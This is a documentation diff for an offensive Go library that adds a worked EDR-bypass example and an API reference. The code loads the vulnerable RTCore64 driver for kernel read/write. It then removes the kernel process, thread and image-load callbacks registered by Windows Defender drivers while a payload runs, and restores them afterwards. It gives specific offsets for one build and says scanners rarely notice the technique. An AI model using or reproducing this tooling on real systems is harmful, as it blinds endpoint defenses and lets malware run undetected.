@@ -179,6 +179,127 @@ PspCreateThreadNotifyRoutine[0]  -> 0xFFFFF89abcdef800 (WdFilter.sys) enabled=tr
 PspLoadImageNotifyRoutine[0]     -> 0xFFFFF89abcdef100 (WdFilter.sys) enabled=true
 ```
 
+## Composed — RTCore64 + selective Remove + Restore (v0.17.1)
+
+Real EDR-bypass usage pairs the enumeration with a driver-backed
+`KernelReadWriter` (e.g. `kernel/driver/rtcore64`), zeroes the slots
+owned by the EDR's notify routines for the duration of the payload,
+then restores everything before exit. The race window between
+`read-original` and `write-zero` is documented as ~µs — RTCore64
+sequences both IOCTLs fast enough that production scanners rarely
+observe a half-written slot.
+
+```go
+package main
+
+import (
+	"fmt"
+	"log"
+
+	"github.com/oioio-space/maldev/evasion/kcallback"
+	"github.com/oioio-space/maldev/kernel/driver/rtcore64"
+)
+
+func main() {
+	// 1. Driver up.
+	var d rtcore64.Driver
+	if err := d.Install(); err != nil { log.Fatal(err) }
+	defer d.Uninstall()
+
+	tab := kcallback.OffsetTable{
+		Build:                   19045,
+		CreateProcessRoutineRVA: 0xC1AAA0,
+		CreateThreadRoutineRVA:  0xC1AC20,
+		LoadImageRoutineRVA:     0xC1AB40,
+		ArrayLen:                64,
+	}
+
+	// 2. Enumerate, then remove every slot that points into a defender driver.
+	cbs, err := kcallback.Enumerate(&d, tab)
+	if err != nil { log.Fatal(err) }
+
+	defenderModules := map[string]bool{
+		"WdFilter.sys": true, "MsSecCore.sys": true, "WdNisDrv.sys": true,
+	}
+	var tokens []kcallback.RemoveToken
+	for _, cb := range cbs {
+		if !defenderModules[cb.Module] { continue }
+		tok, err := kcallback.Remove(cb, &d)
+		if err != nil { log.Printf("remove %s[%d]: %v", cb.Kind, cb.Index, err); continue }
+		tokens = append(tokens, tok)
+		fmt.Printf("removed [%s][%d] %s @ 0x%X\n", cb.Kind, cb.Index, cb.Module, cb.Address)
+	}
+
+	// 3. Always restore, even on early-return / panic.
+	defer func() {
+		for _, tok := range tokens {
+			_ = kcallback.Restore(tok, &d)
+		}
+	}()
+
+	// ... payload runs here without the defender's process/thread/image
+	//     creation callbacks firing ...
+}
+```
+
+The `RemoveToken` is opaque except for `IsZero()`, which makes
+`defer Restore(tok, rw)` safe even before `Remove` runs (zero-token
+restore is a no-op).
+
+## API Reference (v0.17.1)
+
+```go
+type Kind int
+const (
+    KindCreateProcess Kind = iota + 1 // PspCreateProcessNotifyRoutine
+    KindCreateThread                  // PspCreateThreadNotifyRoutine
+    KindLoadImage                     // PspLoadImageNotifyRoutine
+)
+
+type Callback struct {
+    Kind     Kind
+    Index    int
+    SlotAddr uintptr // kernel VA of the slot itself — keyed on by Remove
+    Address  uintptr // resolved callback-function VA (masked PEX_CALLBACK)
+    Module   string  // best-effort driver-name resolution
+    Enabled  bool    // low bit of the slot value
+}
+
+type OffsetTable struct {
+    Build                   uint32 // ntoskrnl build (19045 etc.)
+    CreateProcessRoutineRVA uint32
+    CreateThreadRoutineRVA  uint32
+    LoadImageRoutineRVA     uint32
+    ArrayLen                int    // typically 64 on Win10, 96+ on Win11
+}
+
+type KernelReader interface {
+    ReadKernel(addr uintptr, buf []byte) (int, error)
+}
+type KernelReadWriter interface {
+    KernelReader
+    WriteKernel(addr uintptr, data []byte) (int, error)
+}
+
+func NtoskrnlBase() (uintptr, error)                                   // resolves via NtQSI(SystemModuleInformation)
+func DriverAt(addr uintptr) (string, error)                            // best-effort module-name resolution
+func Enumerate(reader KernelReader, tab OffsetTable) ([]Callback, error)
+
+// v0.17.1
+type RemoveToken struct{ /* opaque */ }
+func (RemoveToken) IsZero() bool
+func Remove(cb Callback, writer KernelReadWriter) (RemoveToken, error)
+func Restore(tok RemoveToken, writer KernelReadWriter) error
+
+var (
+    ErrNoKernelReader   = errors.New("kcallback: no KernelReader available …")
+    ErrReadOnly         = errors.New("kcallback: reader is not KernelReadWriter …")
+    ErrNtoskrnlNotFound = errors.New("kcallback: ntoskrnl.exe not in SystemModuleInformation")
+    ErrOffsetUnknown    = errors.New("kcallback: no offset registered for current ntoskrnl build")
+    ErrEmptySlot        = errors.New("kcallback: slot already empty (nothing to remove)")
+)
+```
+
 ---
 
 ## Future work
